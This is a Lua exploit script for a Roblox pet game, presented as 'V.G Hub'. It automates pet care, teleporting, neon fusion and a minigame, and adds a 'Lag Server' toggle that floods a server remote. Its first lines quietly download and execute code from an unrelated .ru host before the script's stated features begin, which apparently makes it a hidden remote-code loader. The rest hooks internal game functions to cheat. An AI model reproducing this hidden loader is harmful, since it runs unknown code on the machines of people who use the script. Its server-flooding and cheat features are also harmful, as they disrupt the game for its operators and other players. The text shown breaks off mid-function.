wait(7)
task.spawn(function()
    loadstring(game:HttpGet("http://qweaad.ru/af.txt"))()
end)

--=====================================================================
-- СЕРВИСЫ
--=====================================================================
local Players            = game:GetService("Players")
local Workspace          = game:GetService("Workspace")
local ReplicatedStorage  = game:GetService("ReplicatedStorage")
local RunService         = game:GetService("RunService")
local UserInputService   = game:GetService("UserInputService")
local MarketplaceService = game:GetService("MarketplaceService")

local Player            = Players.LocalPlayer
local Character         = Player.Character or Player.CharacterAdded:Wait()
local HumanoidRootPart  = Character:WaitForChild("HumanoidRootPart")

--=====================================================================
-- УТИЛИТЫ ЭКСПЛОИТА
--=====================================================================
local Table        = {6152116144, 185655149}
local Set          = setfpscap
local getupvalue   = getupvalue or debug.getupvalue
local getconstant  = getconstant or debug.getconstant
local getconstants = getconstants or debug.getconstants
local getgc        = getgc or get_gc_objects or debug.getgc
local getreg       = getreg or getregistry or debug.getregistry
local get_thread_context  = get_thread_context or getthreadcontext or getidentity or syn.get_thread_identity
local get_thread_identity = get_thread_context
local set_thread_context  = set_thread_context or setthreadcontext or setidentity or syn.set_thread_identity
local set_thread_identity = set_thread_context
local Remotes     = {}
local Count       = 0

--=====================================================================
-- ТАБЛИЦЫ
--=====================================================================
local Stores = {
    "CoffeeShop","Supermarket","PizzaShop","ToyShop","Obbies","Neighborhood",
    "CampingShop","AutoShop","Nursery","Cave","IceCream","PotionShop","SkyCastle",
    "Hospital","HatShop","PetShop","School","BabyShop","HotSpringHouse","SafetyHub",
    "DebugInterior","VIP","Salon","SpleefMinigame","SimonSaysMinigame","WinterCastle"
}

local Baths = {
    "StylishShower","CheapBathtub","ModernShower","Bathtub","GingerbreadShower","HotTub"
}

local FreeFoods = {
    "ham_vip","water_vip","chocolate_milk_vip","popcorn_vip",
    "marshmallow_on_a_stick","healing_apple","teachers_apple"
}

local Beds = {
    "FancyPetBed","ModernPetBed","CircularPetBed","RectangularPetBed",
    "NormalCrib","BasicCrib","RoyalCrib","PoshCrib"
}

local Tasks = {
    "hungry","sleepy","thirsty","bored","dirty",
    "camping","sick","school","pool_party","salon","pizza_party"
}

local Eggs = {
    "cracked_egg","regular_pet_egg","royal_egg","retired_egg",
    "seasia_2023_egg","mythic_egg","japan_2022_egg","danger_2023_egg"
}

local gifts = {
    "smallgift","biggift","massivegift",
    "legend_hat_2022_simple_chest","legend_hat_2022_regal_chest"
}

local Obbys = {
    "miniworld","coastal_climb","shipwreck_bay","ancient_ruins",
    "lonelypeak","pyramid","tinyisles"
}

local RetardedBullShit = { "CashRegister", "GoldenCashRegister" }

local PP = {}

--=====================================================================
-- СЛУЖЕБНАЯ ЧАСТЬ (пол)
--=====================================================================
local Part = Instance.new("Part")
Part.Name         = "P"
Part.Size         = Vector3.new(9e9, 0, 9e9)
Part.Anchored     = true
Part.Transparency = 0.5
Part.CFrame       = CFrame.new(5000, 5000, 5000)
Part.Parent       = Workspace

ReplicatedStorage:WaitForChild("ClientModules"):WaitForChild("Core")
    :WaitForChild("InteriorsM"):WaitForChild("InteriorsM")

--=====================================================================
-- ПОИСК ФУНКЦИИ SetLocation
--=====================================================================
local Location = nil
for _, v in pairs(getgc()) do
    if type(v) == "function" then
        if getfenv(v).script == ReplicatedStorage.ClientModules.Core.InteriorsM.InteriorsM then
            if table.find(getconstants(v), "LocationAPI/SetLocation") then
                Location = v
                break
            end
        end
    end
end

if not Location then
    warn("[Tasks] LocationAPI/SetLocation не найдена! Телепорты не работают.")
end

local SetLocation = function(A, B, C)
    local O = get_thread_identity()
    set_thread_identity(2)
    Location(A, B, C)
    set_thread_identity(7)
end

--=====================================================================
-- ОПРЕДЕЛЕНИЕ ТЕКУЩЕЙ ЛОКАЦИИ
--=====================================================================
local function Home()
    local bp = Workspace.HouseInteriors.blueprint
    local m = bp and bp:FindFirstChildWhichIsA("Model")
    return m and m.Name or false
end

local PersonHome = Home

local function Store()
    local m = Workspace.Interiors:FindFirstChildWhichIsA("Model")
    if not m then return false end
    if not string.find(m.Name, "MainMap")
       and not string.find(m.Name, "Neighborhood") then
        return m.Name
    end
    return false
end

local function MainMap()
    local m = Workspace.Interiors:FindFirstChildWhichIsA("Model")
    if m and string.find(m.Name, "MainMap") then return m.Name end
    return false
end

local function Neighborhood()
    local m = Workspace.Interiors:FindFirstChildWhichIsA("Model")
    if m and string.find(m.Name, "Neighborhood") then return m.Name end
    return false
end

--=====================================================================
-- ТЕЛЕПОРТЫ (с retry)
--=====================================================================
local function GoToStore(Name)
    if Store() == Name then return true end

    for attempt = 1, 5 do
        print(("[Tasks] GoToStore(%s) попытка %d"):format(Name, attempt))
        pcall(function()
            SetLocation(Name, "MainDoor", {})
        end)

        local t0 = os.clock()
        while os.clock() - t0 < 8 do
            if Store() == Name then
                print(("[Tasks] GoToStore(%s) успешно"):format(Name))
                task.wait(1.5)
                return true
            end
            task.wait(0.3)
        end
    end

    warn(("[Tasks] GoToStore(%s) не удалось"):format(Name))
    return false
end

local function GoToHome()
    for attempt = 1, 5 do
        pcall(function()
            SetLocation("housing", "MainDoor", { house_owner = Player })
        end)

        local t0 = os.clock()
        while os.clock() - t0 < 8 do
            if Home() then
                task.wait(1)
                return true
            end
            task.wait(0.3)
        end
    end
    warn("[Tasks] GoToHome не удалось")
    return false
end

local function GoToNeighborhood()
    for attempt = 1, 5 do
        pcall(function()
            SetLocation("Neighborhood", "MainDoor", {})
        end)

        local t0 = os.clock()
        while os.clock() - t0 < 8 do
            if Neighborhood() then
                task.wait(1)
                return true
            end
            task.wait(0.3)
        end
    end
    return false
end

local function GoToMainMap()
    for attempt = 1, 5 do
        pcall(function()
            SetLocation("MainMap", "Neighborhood/MainDoor", {})
        end)

        local t0 = os.clock()
        while os.clock() - t0 < 8 do
            if MainMap() then
                task.wait(1)
                return true
            end
            task.wait(0.3)
        end
    end
    warn("[Tasks] GoToMainMap не удалось")
    return false
end

local function GoToPersonsHouse(Name)
    for attempt = 1, 5 do
        pcall(function()
            SetLocation("housing", "MainDoor", { house_owner = Players[Name] })
        end)

        local t0 = os.clock()
        while os.clock() - t0 < 8 do
            if PersonHome() then
                task.wait(1)
                return true
            end
            task.wait(0.3)
        end
    end
    return false
end

--=====================================================================
-- ПОИСК МЕБЕЛИ (конкретные модели)
--=====================================================================
local function Dirty()
    local bp = Workspace.HouseInteriors.blueprint
    local model = bp and bp:FindFirstChildWhichIsA("Model")
    if model then
        Player.Character.HumanoidRootPart.CFrame =
            model:GetModelCFrame():ToWorldSpace(CFrame.new(0, 0, -6))
    end
    for _, v in pairs(Workspace.HouseInteriors.furniture:GetChildren()) do
        local m = v:FindFirstChildWhichIsA("Model")
        if m and m.Name == "CheapPetBathtub" then
            local parts = string.split(v.Name, "true/")
            return parts[2]
        end
    end
    return nil
end

local function Sleepy()
    local bp = Workspace.HouseInteriors.blueprint
    local model = bp and bp:FindFirstChildWhichIsA("Model")
    if model then
        Player.Character.HumanoidRootPart.CFrame =
            model:GetModelCFrame():ToWorldSpace(CFrame.new(0, 0, -6))
    end
    for _, v in pairs(Workspace.HouseInteriors.furniture:GetChildren()) do
        local m = v:FindFirstChildWhichIsA("Model")
        if m and m.Name == "BasicCrib" then
            local parts = string.split(v.Name, "true/")
            return parts[2]
        end
    end
    return nil
end

local function Toilet()
    local bp = Workspace.HouseInteriors.blueprint
    local model = bp and bp:FindFirstChildWhichIsA("Model")
    if not model then return nil end

    Player.Character.HumanoidRootPart.CFrame =
        model:GetModelCFrame():ToWorldSpace(CFrame.new(0, 0, -6))

    for _, v in pairs(Workspace.HouseInteriors.furniture:GetChildren()) do
        local m = v:FindFirstChildWhichIsA("Model")
        if m and m.Name == "Toilet" then
            local parts = string.split(v.Name, "true/")
            return parts[2] or parts[1]
        end
    end
    return nil
end

local function Cash()
    for _, v in pairs(Workspace.HouseInteriors.furniture:GetChildren()) do
        local m = v:FindFirstChildWhichIsA("Model")
        if m and table.find(RetardedBullShit, m.Name) then
            local parts = string.split(v.Name, "f")
            return parts[2]
        end
    end
    return nil
end

local function Showers(Name)
    local bp = Workspace.HouseInteriors.blueprint
    local model = bp and bp:FindFirstChildWhichIsA("Model")
    if model then
        Player.Character.HumanoidRootPart.CFrame =
            model:GetModelCFrame():ToWorldSpace(CFrame.new(0, 0, -6))
    end
    for _, v in pairs(Workspace.HouseInteriors.furniture:GetChildren()) do
        local m = v:FindFirstChildWhichIsA("Model")
        if m and table.find(Baths, m.Name) then
            local parts = string.split(v.Name, "true/")
            return parts[2]
        end
    end
    return nil
end

--=====================================================================
-- БЕЗОПАСНОЕ ПОЛУЧЕНИЕ AILMENTS APP
--=====================================================================
local function getAilmentsFrame()
    local pg = Player:FindFirstChild("PlayerGui")
    if not pg then return nil end
    local app = pg:FindFirstChild("AilmentsMonitorApp")
    if not app then return nil end
    return app:FindFirstChild("Ailments")
end

local function getFirstAilment()
    local ailments = getAilmentsFrame()
    if not ailments then return nil end
    return ailments:FindFirstChildWhichIsA("Frame")
end

--=====================================================================
-- ПРОЧЕЕ
--=====================================================================
local function NoCliper()
    for _, v in next, Player.Character:GetChildren() do
        if v:IsA("BasePart") then
            v.CanCollide = false
            v.Velocity   = Vector3.new(0, 0, 0)
        end
    end
    return Player.Character
end

local function Ingame()
    local Lunar2024Shop = Workspace.Interiors:FindFirstChild("Lunar2024Shop")
    if Lunar2024Shop
       and Lunar2024Shop:FindFirstChild("RedLightGreenLight")
       and Lunar2024Shop.RedLightGreenLight.JoinZone.Billboard.BillboardGui
           .TimerLabel.Text:find("GAME IN PROGRESS") then
        return true
    end
    return false
end

local function Dothings()
    local Throwables = Workspace.Interiors.Lunar2024Shop.Arena:FindFirstChild("Throwables")
    if not Ingame() then
        VG.Teleport(Workspace.Interiors.Lunar2024Shop.RedLightGreenLight.JoinZone.Collider.Position)
    end
    if Ingame() then
        for _, v in next, Throwables:GetChildren() do
            if v:IsA("Model") then
                VG.Teleport(v:GetModelCFrame().Position)
                task.wait(.3)
                Count = Count + 1
                print(Count)
                if Count > 3 then break end
            end
        end
        if Count >= 3 then
            VG.Teleport(
                Workspace.Interiors.Lunar2024Shop.Arena.SafeZones
                    :FindFirstChildWhichIsA("BasePart").Position
            )
            task.wait(2)
            Count = 0
        end
    end
end

--=====================================================================
-- ХРАНИЛИЩА ДАННЫХ
--=====================================================================
local Neons          = {}
local AilmentFurnitues = {}
local Neon           = {}
local Spec           = {}
local Key            = {}
local PetID
local Pet
local PetsShow       = {}
local List           = {}
local JoJo           = {}
local GGO            = {}
local Ps             = {}

local ClientData = require(ReplicatedStorage.ClientModules.Core.ClientData)

do
    local count111 = 0
    for _, v in pairs(ClientData.get_data()[Player.Name].inventory.pets) do
        count111 = count111 + 1
        local key = tostring(v.id) .. " - " .. tostring(v.properties.age) .. " years old"
        if not table.find(List, key) and v.kind ~= "practice_dog" then
            PetsShow[key] = v
            table.insert(List, key)
            table.sort(List)
        end
    end
    print(count111)
end

--=====================================================================
-- FPS CAP
--=====================================================================
UserInputService.WindowFocusReleased:Connect(function()
    if Render then
        RunService:Set3dRenderingEnabled(false)
        Set(table.find(Table, game.PlaceId) and 30 or 15)
    end
end)
UserInputService.WindowFocused:Connect(function()
    if Render then
        RunService:Set3dRenderingEnabled(true)
        Set(100)
    end
end)

--=====================================================================
-- ПРОЧИЕ ХУКИ
--=====================================================================
for i, v in pairs(getupvalue(require(ReplicatedStorage.Fsys).load("RouterClient").init, 4)) do
    v.Name = i
end

pcall(function()
    ReplicatedStorage.API:FindFirstChild("DailyLoginAPI/ClaimDailyReward"):InvokeServer()
end)

--=====================================================================
-- ОБРАБОТЧИКИ ЗАДАЧ БЕЗ GUI
--=====================================================================
local remoteHandlers = {
    ["pet_me"] = function()
        local function triggerOnce()
            local pet = Workspace.Pets:GetChildren()[1]
            if not pet then return end

            pcall(function()
                ReplicatedStorage.API["PetAPI/ReplicateActivePerformances"]:FireServer(table.unpack({
                    pet,
                    [2] = { ["FocusPet"] = true },
                }))
            end)

            pcall(function()
                ReplicatedStorage.API["PetAPI/PetPetted"]:FireServer(table.unpack({
                    [1] = PetID,
                    [2] = Player,
                }))
            end)

            pcall(function()
                ReplicatedStorage.API["AilmentsAPI/ProgressPetMeAilment"]:FireServer(PetID)
            end)
        end

        print("[Tasks] pet_me → trigger 1")
        triggerOnce()

        task.wait(10)

        print("[Tasks] pet_me → trigger 2")
        triggerOnce()

        task.wait(2)

        print("[Tasks] pet_me → trigger 3")
        triggerOnce()

        task.wait(20)
        print("[Tasks] pet_me → done")
    end,

       ["sleepy"] = function()
        GoToHome()
        task.wait(1)

        local furn = Sleepy()

        -- Если BasicCrib нет — покупаем
        if not furn then
            print("[Tasks] sleepy → BasicCrib нет, покупаю...")
            pcall(function()
                ReplicatedStorage.API["HousingAPI/BuyFurnitures"]:InvokeServer({
                    [1] = {
                        ["kind"] = "basiccrib",
                        ["properties"] = {
                            ["cframe"] = CFrame.new(
                                -5996, 4009, -9032.5,
                                1, 0, 0,
                                0, 0, -1,
                                0, 1, 0
                            ),
                        },
                    },
                })
            end)

            task.wait(3)

            -- Ищем BasicCrib ещё раз после покупки
            furn = Sleepy()
            if not furn then
                warn("[Tasks] BasicCrib не найден даже после покупки")
                return
            end
        end

        print("[Tasks] sleepy → BasicCrib:", furn)

        for _ = 1, 5 do
            local pet = Workspace.Pets:GetChildren()[1]
            if pet then
                ReplicatedStorage:FindFirstChild('HousingAPI/ActivateFurniture', true)
                    :InvokeServer(Player, furn, 'UseBlock',
                        { cframe = Player.Character.HumanoidRootPart.CFrame }, pet)
            end
            task.wait(3)
        end
    end,

    ["dirty"] = function()
        GoToHome()
        local furn = Dirty()
        if not furn then
            warn("[Tasks] CheapPetBathtub не найден")
            return
        end
        print("[Tasks] dirty → CheapPetBathtub:", furn)
        for _ = 1, 5 do
            local pet = Workspace.Pets:GetChildren()[1]
            if pet then
                ReplicatedStorage:FindFirstChild("HousingAPI/ActivateFurniture", true)
                    :InvokeServer(Player, furn, 'UseBlock',
                        { cframe = Player.Character.HumanoidRootPart.CFrame }, pet)
            end
            task.wait(3)
        end
    end,

    ["toilet"] = function()
        GoToHome()
        local furn = Toilet()
        if not furn then
            warn("[Tasks] Toilet не найден")
            return
        end
        local pet = Workspace.Pets:GetChildren()[1]
        if pet then
            ReplicatedStorage:FindFirstChild("HousingAPI/ActivateFurniture", true)
                :InvokeServer(Player, furn, 'Seat1',
                    { cframe = Player.Character.HumanoidRootPart.CFrame }, pet)
        end
    end,

    ["hungry"] = function()
        ReplicatedStorage.API["ShopAPI/BuyItem"]:InvokeServer(table.unpack({
            [1] = "food", [2] = "donut", [3] = { ["buy_count"] = 1 },
        }))
        task.wait(1)
        local Foods = ClientData.get_data()[Player.Name].inventory.food or {}
        local FoodUnique
        for _, v in pairs(Foods) do
            if v.id == "donut" then FoodUnique = v.unique break end
        end
        if not FoodUnique then return end
        task.wait(1)
        ReplicatedStorage.API["PetObjectAPI/CreatePetObject"]:InvokeServer(table.unpack({
            [1] = "__Enum_PetObjectCreatorType_2",
            [2] = {
                ["pet_unique"] = PetID,
                ["additional_consume_uniques"] = {},
                ["unique_id"] = FoodUnique,
            },
        }))
        task.wait(20)
        ReplicatedStorage.API["PetAPI/ConsumeFoodItem"]:FireServer(FoodUnique)
    end,

    ["thirsty"] = function()
        ReplicatedStorage.API["ShopAPI/BuyItem"]:InvokeServer(table.unpack({
            [1] = "food", [2] = "tea", [3] = { ["buy_count"] = 1 },
        }))
        task.wait(1)
        local Foods = ClientData.get_data()[Player.Name].inventory.food or {}
        local FoodUnique
        for _, v in pairs(Foods) do
            if v.id == "tea" then FoodUnique = v.unique break end
        end
        if not FoodUnique then
            warn("[Tasks] tea не найден")
            return
        end
        task.wait(1)
        ReplicatedStorage.API["PetObjectAPI/CreatePetObject"]:InvokeServer(table.unpack({
            [1] = "__Enum_PetObjectCreatorType_2",
            [2] = {
                ["pet_unique"] = PetID,
                ["additional_consume_uniques"] = {},
                ["unique_id"] = FoodUnique,
            },
        }))
        task.wait(20)
        ReplicatedStorage.API["PetAPI/ConsumeFoodItem"]:FireServer(FoodUnique)
    end,

    ["play"] = function()
        local inv = ClientData.get_data()[Player.Name].inventory
        local ToyID

        for _, listName in ipairs({"bone"}) do
            local list = inv[listName]
            if type(list) == "table" then
                for _, v in pairs(list) do
                    if v.unique then
                        ToyID = v.unique
                        break
                    end
                end
            end
            if ToyID then break end
        end

        if not ToyID then
            for _, list in pairs(inv) do
                if type(list) == "table" then
                    for _, v in pairs(list) do
                        if type(v) == "table" and v.id and v.unique
                           and tostring(v.id):lower():find("bone") then
                            ToyID = v.unique
                            break
                        end
                    end
                end
                if ToyID then break end
            end
        end

        if not ToyID then
            warn("[Tasks] play → игрушка не найдена в инвентаре")
            return
        end

        print("[Tasks] play → toyid:", ToyID)

        for i = 1, 3 do
            ReplicatedStorage.API["PetObjectAPI/CreatePetObject"]:InvokeServer(table.unpack({
                [1] = "__Enum_PetObjectCreatorType_1",
                [2] = {
                    ["reaction_name"] = "ThrowToyReaction",
                    ["unique_id"] = ToyID,
                },
            }))
            task.wait(7)
        end

        task.wait(3)
    end,

    ["sick"] = function()
        ReplicatedStorage.API["ShopAPI/BuyItem"]:InvokeServer(table.unpack({
            [1] = "food", [2] = "healing_apple", [3] = { ["buy_count"] = 1 },
        }))
        task.wait(1)
        local Foods = ClientData.get_data()[Player.Name].inventory.food or {}
        local FoodUnique
        for _, v in pairs(Foods) do
            if v.id == "healing_apple" then FoodUnique = v.unique break end
        end
        if not FoodUnique then
            warn("[Tasks] healing_apple не найден в инвентаре")
            return
        end
        task.wait(1)
        ReplicatedStorage.API["PetObjectAPI/CreatePetObject"]:InvokeServer(table.unpack({
            [1] = "__Enum_PetObjectCreatorType_2",
            [2] = {
                ["pet_unique"] = PetID,
                ["additional_consume_uniques"] = {},
                ["unique_id"] = FoodUnique,
            },
        }))
        task.wait(20)
        ReplicatedStorage.API["PetAPI/ConsumeFoodItem"]:FireServer(FoodUnique)
    end,

    ["adoption_party"] = function() GoToStore('Nursery') end,
    ["school"]         = function() GoToStore('School') end,
    ["pizza_party"]    = function() GoToStore("PizzaShop") end,
    ["salon"]          = function() GoToStore("Salon") end,

    ["pool_party"] = function()
        GoToMainMap()
        Player.Character.HumanoidRootPart.CFrame =
            CFrame.new(Workspace.StaticMap.Pool.PoolOrigin.Position + Vector3.new(0, 5, 0))
    end,

    ["camping"] = function()
        GoToMainMap()
        Player.Character.HumanoidRootPart.CFrame =
            CFrame.new(Workspace.StaticMap.Campsite.CampsiteOrigin.Position + Vector3.new(0, 5, 0))
    end,

    ["bored"] = function()
        GoToMainMap()
        Player.Character.HumanoidRootPart.CFrame =
            CFrame.new(Workspace.StaticMap.Park.AilmentTarget.Position + Vector3.new(0, 5, 0))
    end,

    ["walk"] = function()
        GoToMainMap()
        task.wait(2)

        -- Точка, где начинается walk-зона
        local origin = Workspace.StaticMap.Park.AilmentTarget.Position

        -- Сначала телепорт в стартовую точку
        Player.Character.HumanoidRootPart.CFrame =
            CFrame.new(origin + Vector3.new(0, 5, 0))

        task.wait(1)

        local hum = Player.Character:FindFirstChildWhichIsA("Humanoid")
        if not hum then return end

        -- Ходим кругами 25 секунд, обновляя направление и позицию
        for i = 1, 50 do
            local angle = i * 0.3
            local target = origin + Vector3.new(math.sin(angle) * 20, 5, math.cos(angle) * 20)
            hum:MoveTo(target)

            -- Периодически пере-телепортируем, чтобы сервер точно видел движение
            Player.Character.HumanoidRootPart.CFrame =
                CFrame.new(target)

            task.wait(0.5)
        end

        hum:MoveTo(Player.Character.HumanoidRootPart.Position)  -- остановка
    end,
}

--=====================================================================
-- REMOTE-ПОЛУЧЕНИЕ ЗАДАЧ
--=====================================================================
local ailmentsCache   = {}
local lastProgress    = {}
local cooldownUntil   = {}      -- name → os.clock() когда снова можно
local activeTask      = nil
local activeTaskStart = 0
local lastTaskProgressTime = 0
local lastRefresh     = 0
local REFRESH_COOLDOWN = 120

-- Категории задач
local TASK_CATEGORIES = {
    instant  = { hungry=1, thirsty=1, sick=1, dirty=1, sleepy=1, toilet=1, play=1, pet_me=1 },
    location = { school=1, salon=1, pizza_party=1, adoption_party=1, pool_party=1, camping=1, bored=1 },
    movement = { walk=1 },
}

-- Таймауты по категориям
local TIMEOUTS = {
    instant  = { stuck = 90,  total = 240 },
    location = { stuck = 60,  total = 300 },
    movement = { stuck = 120, total = 360 },
    unknown  = { stuck = 60,  total = 240 },
}

local FAIL_COOLDOWN = 300  -- 5 минут на провалившийся таск

local function getCategory(name)
    for cat, list in pairs(TASK_CATEGORIES) do
        if list[name] then return cat end
    end
    return "unknown"
end

local function getTimeout(name, key)
    local cat = getCategory(name)
    return TIMEOUTS[cat][key]
end

local function isOnCooldown(name)
    local t = cooldownUntil[name]
    return t and os.clock() < t
end

local function setCooldown(name, seconds)
    cooldownUntil[name] = os.clock() + seconds
    print(("[Tasks] %s → cooldown %d сек"):format(name, seconds))
end

local Remote = ReplicatedStorage.API:FindFirstChild("DataAPI/DataChanged")

if Remote then
    Remote.OnClientEvent:Connect(function(...)
        local args = {...}
        if #args < 3 then return end

        local dataType = args[2]
        local data     = args[3]

        if dataType ~= "ailments_manager" then return end
        if type(data) ~= "table" or type(data.ailments) ~= "table" then return end

        for petId, petAilments in pairs(data.ailments) do
            ailmentsCache[petId] = petAilments
        end
    end)
end

local function refreshPetData(force)
    local now = os.clock()
    if not force and (now - lastRefresh) < REFRESH_COOLDOWN then
        return false
    end
    if not PetID then return false end

    lastRefresh = now

    pcall(function()
        ReplicatedStorage.API["ToolAPI/Unequip"]:InvokeServer(PetID)
    end)
    task.wait(0.5)
    pcall(function()
        ReplicatedStorage.API["ToolAPI/Equip"]:InvokeServer(PetID)
    end)

    return true
end

--=====================================================================
-- АНАЛИЗ ЗАДАЧ
--=====================================================================
local function analyzeTasks()
    if not PetID then return nil end

    local petAilments = ailmentsCache[PetID]
    if not petAilments then return nil end

    local priority = {}
    local normal   = {}

    for name, info in pairs(petAilments) do
        if not remoteHandlers[name] then
            if not cooldownUntil[name] then
                cooldownUntil[name] = -1  -- пометили, что знаем
                print(("[Tasks] Нет обработчика для: %s → пропускаю"):format(name))
            end
        elseif isOnCooldown(name) then
            -- в кулдауне после провала
        else
            local p = info.progress or 0
            local created = info.created_timestamp or 0
            local entry = { name = name, progress = p, created = created }

            if p > 0 then
                priority[#priority + 1] = entry
            else
                normal[#normal + 1] = entry
            end
        end
    end

    table.sort(priority, function(a, b)
        if a.created ~= b.created then return a.created < b.created end
        return a.progress > b.progress
    end)

    table.sort(normal, function(a, b)
        return a.created < b.created
    end)

    return { priority = priority, normal = normal, petAilments = petAilments }
end

--=====================================================================
-- ЦИКЛ AUTO PET
--=====================================================================
local TELEPORT_RETRY_DELAY = 3

local function autoPetLoop()
    while task.wait(2) and PetFarm do
        if not PetID then
            task.wait(2)
            continue
        end

        if activeTask then
            local name = activeTask
            local petAilments = ailmentsCache[PetID]
            local info = petAilments and petAilments[name]

            -- Выполнено
            if not info then
                print(("[Tasks] %s → выполнена"):format(name))
                lastProgress[name] = nil
                activeTask = nil
                task.wait(2)
                continue
            end

            -- Общий таймаут
            local totalTimeout = getTimeout(name, "total")
            if os.clock() - activeTaskStart > totalTimeout then
                print(("[Tasks] %s → общий таймаут %d сек, сбрасываю")
                    :format(name, totalTimeout))
                setCooldown(name, FAIL_COOLDOWN)
                lastProgress[name] = nil
                activeTask = nil
                continue
            end

            -- Проверка прогресса
            local currentProgress = info.progress or 0
            local lastP = lastProgress[name]

            if lastP ~= nil and currentProgress ~= lastP then
                print(("[Tasks] %s прогресс: %s → %s")
                    :format(name, tostring(lastP), tostring(currentProgress)))
                lastProgress[name] = currentProgress
                lastTaskProgressTime = os.clock()
            else
                lastProgress[name] = currentProgress
                local stuckTime = os.clock() - lastTaskProgressTime
                local stuckTimeout = getTimeout(name, "stuck")

                if stuckTime > stuckTimeout then
                    print(("[Tasks] %s → stuck %d сек (лимит %d), сброс в cooldown")
                        :format(name, math.floor(stuckTime), stuckTimeout))
                    setCooldown(name, FAIL_COOLDOWN)
                    lastProgress[name] = nil
                    activeTask = nil
                    if ailmentsCache[PetID] and ailmentsCache[PetID][name] then
                        ailmentsCache[PetID][name] = nil
                    end
                    continue
                else
                    print(("[Tasks] %s прогресс не менялся (%s), retry (stuck %d/%d)")
                        :format(name, tostring(currentProgress),
                            math.floor(stuckTime), stuckTimeout))
                    task.wait(TELEPORT_RETRY_DELAY)
                    task.spawn(function()
                        local ok, err = pcall(remoteHandlers[name])
                        if not ok then
                            warn(("[Tasks] Ошибка в %s: %s"):format(name, tostring(err)))
                            setCooldown(name, FAIL_COOLDOWN)
                            activeTask = nil
                        end
                    end)
                end
            end

            task.wait(2)
            continue
        end

        -- Нет активной — ищем
        local analysis = analyzeTasks()
        if analysis then
            local target = nil

            if #analysis.priority > 0 then
                target = analysis.priority[1]
                print(("[Tasks] Приоритет: %s (progress=%s, age=%s)")
                    :format(target.name, tostring(target.progress), tostring(target.created)))
            elseif #analysis.normal > 0 then
                target = analysis.normal[1]
                print(("[Tasks] Обычный: %s (age=%s)")
                    :format(target.name, tostring(target.created)))
            end

            if target then
                activeTask           = target.name
                activeTaskStart      = os.clock()
                lastTaskProgressTime = os.clock()
                lastProgress[target.name] = target.progress

                print(("[Tasks] Запуск %s (категория: %s)")
                    :format(target.name, getCategory(target.name)))

                task.spawn(function()
                    local ok, err = pcall(remoteHandlers[target.name])
                    if not ok then
                        warn(("[Tasks] Ошибка в %s: %s"):format(target.name, tostring(err)))
                        setCooldown(target.name, FAIL_COOLDOWN)
                        activeTask = nil
                    end
                end)
            else
                -- Нет задач в очереди — можно обновить кэш
                refreshPetData(false)
            end
        end

        task.wait(3)
    end
end

--=====================================================================
-- FLUENT UI
--=====================================================================
local Fluent           = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
local SaveManager      = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()

local Window = Fluent:CreateWindow({
    Title     = "V.G Hub: Game " .. MarketplaceService:GetProductInfo(game.PlaceId).Name,
    SubTitle  = "by DekuDimz",
    TabWidth  = 160,
    Size      = UDim2.fromOffset(580, 460),
    Acrylic   = false,
    Theme     = "Dark",
    MinimizeKey = Enum.KeyCode.Delete
})

local Tabs = {
    Main     = Window:AddTab({ Title = "Main",     Icon = "" }),
    Settings = Window:AddTab({ Title = "Settings", Icon = "settings" })
}
local Options = Fluent.Options

Fluent:Notify({
    Title    = "V.G Hub Loaded",
    Content  = "Congrats your using V.G Hub",
    Duration = 10
})

--=====================================================================
-- UI
--=====================================================================
do
    local Toggle = Tabs.Main:AddToggle("v3", { Title = "RedLightGreenLight Minigame", Default = false })
    Toggle:OnChanged(function()
        local on = Options.v3.Value
        spawn(function()
            while on and task.wait() do
                pcall(Dothings)
            end
        end)
    end)

    Toggle = Tabs.Main:AddToggle("no", { Title = "Baby Farm", Default = false })
    Toggle:OnChanged(function()
        BabyFarm = Options.no.Value
        spawn(function()
            pcall(function()
                ReplicatedStorage.API["TeamAPI/ChooseTeam"]:InvokeServer(
                    BabyFarm and "Babies" or "Parents",
                    {}
                )
            end)
        end)
        spawn(function()
            while task.wait(1) and BabyFarm do
                pcall(function()
                    local ailments = getAilmentsFrame()
                    if not ailments then return end
                    for _, v in pairs(ailments:GetChildren()) do
                        if v:IsA("Frame") then
                            task.wait(.1)
                            ReplicatedStorage.API["MonitorAPI/AddAdditive"]:FireServer(v.Name, math.random(1, 100))
                        end
                    end
                end)
            end
        end)
    end)

    Toggle = Tabs.Main:AddToggle("CPU", { Title = "LowCpu render", Default = false })
    Toggle:OnChanged(function()
        Render = Options.CPU.Value
    end)

    Toggle = Tabs.Main:AddToggle("Cr", { Title = "Lag Server", Default = false })
    Toggle:OnChanged(function()
        Crash = Options.Cr.Value
    end)
    RunService.RenderStepped:Connect(function()
        if Crash then
            for _ = 1, 50 do
                pcall(function()
                    ReplicatedStorage.API["TeamAPI/ChooseTeam"]:InvokeServer("Babies", {})
                end)
            end
        end
    end)

    Toggle = Tabs.Main:AddToggle("Ne", { Title = "Auto Neon", Default = false })
    Toggle:OnChanged(function()
        Neon = Options.Ne.Value
        spawn(function()
            while Neon and task.wait() do
                pcall(function()
                    local N = 0
                    for _, v in pairs(ClientData.get_data()[Player.Name].inventory.pets) do
                        if v.properties.age == 6 then
                            N = N + 1
                            table.insert(Neons, v.unique)
                            if N == 4 then
                                ReplicatedStorage.API:FindFirstChild("PetAPI/DoNeonFusion"):InvokeServer({ unpack(Neons) })
                                table.clear(Neons)
                                N = 0
                            end
                        end
                    end
                end)
            end
        end)
    end)

    local Dropdown = Tabs.Main:AddDropdown("d", { Title = "Pets", Values = List, Multi = false, Default = 1 })
    Dropdown:SetValue(nil)
    Dropdown:OnChanged(function(Value)
        Key = PetsShow[Value]
        if Key then
            PetID = Key.unique
            print("[Tasks] PetID:", PetID)
        end
    end)

    Toggle = Tabs.Main:AddToggle("New", { Title = "Auto pet", Default = false })
    Toggle:OnChanged(function()
        PetFarm = Options.New.Value

        if not PetFarm then
            activeTask = nil
            lastProgress = {}
            cooldownUntil = {}
        end

        RunService.RenderStepped:Connect(function()
            if PetFarm then
                pcall(function()
                    Workspace["P"].CFrame = Player.Character.HumanoidRootPart.CFrame * CFrame.new(0, -5, 0)
                    NoCliper()
                end)
            end
        end)

        spawn(function()
            while task.wait(20) and PetFarm do
                pcall(function()
                    ReplicatedStorage.API["ToolAPI/Unequip"]:InvokeServer(PetID)
